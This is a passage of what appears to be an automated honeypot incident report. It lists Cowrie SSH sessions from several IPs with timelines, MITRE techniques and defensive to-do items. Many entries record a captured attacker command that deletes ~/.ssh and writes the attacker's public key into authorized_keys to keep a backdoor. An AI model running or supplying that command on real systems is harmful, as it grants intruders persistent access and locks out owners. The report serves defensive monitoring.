| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 21:07:50` | `cowrie.session.connect` |
| `2026-06-12 21:07:50` | `cowrie.client.version` |
| `2026-06-12 21:07:50` | `cowrie.client.kex` |
| `2026-06-12 21:07:51` | `cowrie.login.success` |
| `2026-06-12 21:07:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-492911a94e96

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-06-12 21:10 |
| **Last Seen** | 2026-06-12 21:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 21:10:07` | `cowrie.session.connect` |
| `2026-06-12 21:10:07` | `cowrie.client.version` |
| `2026-06-12 21:10:07` | `cowrie.client.kex` |
| `2026-06-12 21:10:07` | `cowrie.login.success` |
| `2026-06-12 21:10:07` | `cowrie.session.params` |
| `2026-06-12 21:10:07` | `cowrie.command.input` |
| `2026-06-12 21:10:07` | `cowrie.command.failed` |
| `2026-06-12 21:10:08` | `cowrie.log.closed` |
| `2026-06-12 21:10:08` | `cowrie.session.params` |
| `2026-06-12 21:10:08` | `cowrie.command.input` |
| `2026-06-12 21:10:08` | `cowrie.session.file_download` |
| `2026-06-12 21:10:08` | `cowrie.log.closed` |
| `2026-06-12 21:10:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d969c68da991

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-06-12 21:10 |
| **Last Seen** | 2026-06-12 21:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 21:10:10` | `cowrie.session.connect` |
| `2026-06-12 21:10:10` | `cowrie.client.version` |
| `2026-06-12 21:10:10` | `cowrie.client.kex` |
| `2026-06-12 21:10:11` | `cowrie.login.success` |
| `2026-06-12 21:10:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbefb228a3f5

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-06-12 21:17 |
| **Last Seen** | 2026-06-12 21:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 21:17:09` | `cowrie.session.connect` |
| `2026-06-12 21:17:09` | `cowrie.client.version` |
| `2026-06-12 21:17:09` | `cowrie.client.kex` |
| `2026-06-12 21:17:09` | `cowrie.login.success` |
| `2026-06-12 21:17:10` | `cowrie.session.params` |
| `2026-06-12 21:17:10` | `cowrie.command.input` |
| `2026-06-12 21:17:10` | `cowrie.command.failed` |
| `2026-06-12 21:17:10` | `cowrie.log.closed` |
| `2026-06-12 21:17:10` | `cowrie.session.params` |
| `2026-06-12 21:17:10` | `cowrie.command.input` |
| `2026-06-12 21:17:10` | `cowrie.session.file_download` |
| `2026-06-12 21:17:10` | `cowrie.log.closed` |
| `2026-06-12 21:17:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4bb3c226282

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-06-12 21:17 |
| **Last Seen** | 2026-06-12 21:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 21:17:12` | `cowrie.session.connect` |
| `2026-06-12 21:17:12` | `cowrie.client.version` |
| `2026-06-12 21:17:12` | `cowrie.client.kex` |
| `2026-06-12 21:17:13` | `cowrie.login.success` |
| `2026-06-12 21:17:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-856089656a48

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-06-12 21:23 |
| **Last Seen** | 2026-06-12 21:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 21:23:58` | `cowrie.session.connect` |
| `2026-06-12 21:23:58` | `cowrie.client.version` |
| `2026-06-12 21:23:58` | `cowrie.client.kex` |
| `2026-06-12 21:23:59` | `cowrie.login.success` |
| `2026-06-12 21:23:59` | `cowrie.session.params` |
| `2026-06-12 21:23:59` | `cowrie.command.input` |
| `2026-06-12 21:23:59` | `cowrie.command.failed` |
| `2026-06-12 21:23:59` | `cowrie.log.closed` |
| `2026-06-12 21:24:00` | `cowrie.session.params` |
| `2026-06-12 21:24:00` | `cowrie.command.input` |
| `2026-06-12 21:24:00` | `cowrie.session.file_download` |
| `2026-06-12 21:24:00` | `cowrie.log.closed` |
| `2026-06-12 21:24:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0652ee502a12

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-06-12 21:24 |
| **Last Seen** | 2026-06-12 21:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 21:24:02` | `cowrie.session.connect` |
| `2026-06-12 21:24:02` | `cowrie.client.version` |
| `2026-06-12 21:24:02` | `cowrie.client.kex` |
| `2026-06-12 21:24:02` | `cowrie.login.success` |
| `2026-06-12 21:24:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6779d9c6b158

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-06-12 21:26 |
| **Last Seen** | 2026-06-12 21:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 21:26:18` | `cowrie.session.connect` |
| `2026-06-12 21:26:18` | `cowrie.client.version` |
| `2026-06-12 21:26:18` | `cowrie.client.kex` |
| `2026-06-12 21:26:18` | `cowrie.login.success` |
| `2026-06-12 21:26:19` | `cowrie.session.params` |
| `2026-06-12 21:26:19` | `cowrie.command.input` |
| `2026-06-12 21:26:19` | `cowrie.command.failed` |
| `2026-06-12 21:26:19` | `cowrie.log.closed` |
| `2026-06-12 21:26:19` | `cowrie.session.params` |
| `2026-06-12 21:26:19` | `cowrie.command.input` |
| `2026-06-12 21:26:19` | `cowrie.session.file_download` |
| `2026-06-12 21:26:19` | `cowrie.log.closed` |
| `2026-06-12 21:26:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d7aa79f995b

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-06-12 21:26 |
| **Last Seen** | 2026-06-12 21:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 21:26:21` | `cowrie.session.connect` |
| `2026-06-12 21:26:21` | `cowrie.client.version` |
| `2026-06-12 21:26:21` | `cowrie.client.kex` |
| `2026-06-12 21:26:22` | `cowrie.login.success` |
| `2026-06-12 21:26:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a259b60fcf31

| Field | Detail |
|---|---|
| **Source IP** | `222.253.40[.]231` |
| **First Seen** | 2026-06-12 21:29 |
| **Last Seen** | 2026-06-12 21:29 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 21:29:03` | `cowrie.session.connect` |
| `2026-06-12 21:29:03` | `cowrie.client.version` |
| `2026-06-12 21:29:03` | `cowrie.client.kex` |
| `2026-06-12 21:29:04` | `cowrie.login.success` |
| `2026-06-12 21:29:04` | `cowrie.session.params` |
| `2026-06-12 21:29:04` | `cowrie.command.input` |
| `2026-06-12 21:29:04` | `cowrie.command.failed` |
| `2026-06-12 21:29:04` | `cowrie.log.closed` |
| `2026-06-12 21:29:05` | `cowrie.session.params` |
| `2026-06-12 21:29:05` | `cowrie.command.input` |
| `2026-06-12 21:29:05` | `cowrie.session.file_download` |
| `2026-06-12 21:29:05` | `cowrie.log.closed` |
| `2026-06-12 21:29:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.253.40[.]231` to AbuseIPDB if not already reported
- [ ] Block `222.253.40[.]231` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6aa2ea7d468

| Field | Detail |
|---|---|
| **Source IP** | `222.253.40[.]231` |
| **First Seen** | 2026-06-12 21:29 |
| **Last Seen** | 2026-06-12 21:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 21:29:07` | `cowrie.session.connect` |
| `2026-06-12 21:29:07` | `cowrie.client.version` |
| `2026-06-12 21:29:08` | `cowrie.client.kex` |
| `2026-06-12 21:29:08` | `cowrie.login.success` |
| `2026-06-12 21:29:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.253.40[.]231` to AbuseIPDB if not already reported
- [ ] Block `222.253.40[.]231` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4faac764f3a5

| Field | Detail |
|---|---|
| **Source IP** | `182.253.79[.]195` |
| **First Seen** | 2026-06-12 21:29 |
| **Last Seen** | 2026-06-12 21:29 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 21:29:28` | `cowrie.session.connect` |
| `2026-06-12 21:29:28` | `cowrie.client.version` |
| `2026-06-12 21:29:29` | `cowrie.client.kex` |
| `2026-06-12 21:29:29` | `cowrie.login.success` |
| `2026-06-12 21:29:30` | `cowrie.session.params` |
| `2026-06-12 21:29:30` | `cowrie.command.input` |
| `2026-06-12 21:29:30` | `cowrie.command.failed` |
| `2026-06-12 21:29:30` | `cowrie.log.closed` |
| `2026-06-12 21:29:30` | `cowrie.session.params` |
| `2026-06-12 21:29:30` | `cowrie.command.input` |
| `2026-06-12 21:29:31` | `cowrie.session.file_download` |
| `2026-06-12 21:29:31` | `cowrie.log.closed` |
| `2026-06-12 21:29:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.253.79[.]195` to AbuseIPDB if not already reported
- [ ] Block `182.253.79[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebf44f4d5c7c

| Field | Detail |
|---|---|
| **Source IP** | `182.253.79[.]195` |
| **First Seen** | 2026-06-12 21:29 |
| **Last Seen** | 2026-06-12 21:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 21:29:33` | `cowrie.session.connect` |
| `2026-06-12 21:29:33` | `cowrie.client.version` |
| `2026-06-12 21:29:33` | `cowrie.client.kex` |
| `2026-06-12 21:29:34` | `cowrie.login.success` |
| `2026-06-12 21:29:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.253.79[.]195` to AbuseIPDB if not already reported
- [ ] Block `182.253.79[.]195` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb01379bf37a

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-06-12 21:33 |
| **Last Seen** | 2026-06-12 21:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 21:33:15` | `cowrie.session.connect` |
| `2026-06-12 21:33:15` | `cowrie.client.version` |
| `2026-06-12 21:33:15` | `cowrie.client.kex` |
| `2026-06-12 21:33:15` | `cowrie.login.success` |
| `2026-06-12 21:33:16` | `cowrie.session.params` |
| `2026-06-12 21:33:16` | `cowrie.command.input` |
| `2026-06-12 21:33:16` | `cowrie.command.failed` |
| `2026-06-12 21:33:16` | `cowrie.log.closed` |
| `2026-06-12 21:33:16` | `cowrie.session.params` |
| `2026-06-12 21:33:16` | `cowrie.command.input` |
| `2026-06-12 21:33:16` | `cowrie.session.file_download` |
| `2026-06-12 21:33:16` | `cowrie.log.closed` |
| `2026-06-12 21:33:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c448baae6f0e

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-06-12 21:33 |
| **Last Seen** | 2026-06-12 21:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 21:33:18` | `cowrie.session.connect` |
| `2026-06-12 21:33:18` | `cowrie.client.version` |
| `2026-06-12 21:33:18` | `cowrie.client.kex` |
| `2026-06-12 21:33:19` | `cowrie.login.success` |
| `2026-06-12 21:33:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-084e7bfea76b

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-06-12 21:44 |
| **Last Seen** | 2026-06-12 21:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 21:44:42` | `cowrie.session.connect` |
| `2026-06-12 21:44:42` | `cowrie.client.version` |
| `2026-06-12 21:44:42` | `cowrie.client.kex` |
| `2026-06-12 21:44:42` | `cowrie.login.success` |
| `2026-06-12 21:44:42` | `cowrie.session.params` |
| `2026-06-12 21:44:42` | `cowrie.command.input` |
| `2026-06-12 21:44:42` | `cowrie.command.failed` |
| `2026-06-12 21:44:43` | `cowrie.log.closed` |
| `2026-06-12 21:44:43` | `cowrie.session.params` |
| `2026-06-12 21:44:43` | `cowrie.command.input` |
| `2026-06-12 21:44:43` | `cowrie.session.file_download` |
| `2026-06-12 21:44:43` | `cowrie.log.closed` |
| `2026-06-12 21:44:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e46fd46b055

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-06-12 21:44 |
| **Last Seen** | 2026-06-12 21:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 21:44:45` | `cowrie.session.connect` |
| `2026-06-12 21:44:45` | `cowrie.client.version` |
| `2026-06-12 21:44:45` | `cowrie.client.kex` |
| `2026-06-12 21:44:46` | `cowrie.login.success` |
| `2026-06-12 21:44:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f8b6a0f6150

| Field | Detail |
|---|---|
| **Source IP** | `104.244.74[.]84` |
| **First Seen** | 2026-06-12 21:47 |
| **Last Seen** | 2026-06-12 21:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
